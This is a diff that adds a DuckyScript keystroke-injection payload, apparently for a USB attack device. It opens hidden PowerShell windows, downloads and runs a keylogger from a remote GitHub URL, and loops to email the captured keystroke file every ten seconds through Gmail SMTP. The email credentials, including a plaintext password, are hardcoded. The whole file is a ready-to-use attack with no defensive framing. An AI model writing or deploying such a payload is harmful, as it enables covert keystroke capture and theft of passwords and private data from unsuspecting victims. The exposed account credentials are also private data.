@@ -1,1 +1,18 @@
-
+DELAY 500
+GUI r
+DELAY 50
+STRING powershell -WindowStyle hidden
+ENTER
+DELAY 100
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/securethelogs/Keylogger/master/Keylogger.ps1')
+DELAY 300
+ENTER
+DELAY 500
+GUI r
+DELAY 50
+STRING powershell -WindowStyle hidden 
+ENTER
+DELAY 100
+STRING while ($true) { $EmailTo = "njv3303@gmail.com"; $EmailFrom = "larry.allan98@gmail.com"; $Subject = "Test"; $Body = Get-Content -Path c:\temp\keylogger.txt; $SMTPServer = "smtp.gmail.com"; $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body); $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPClient.EnableSsl = $true; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("larry.allan98@gmail.com", "RaspPi11006!"); $SMTPClient.Send($SMTPMessage); Start-Sleep -Seconds 10 }
+DELAY 300
+ENTER
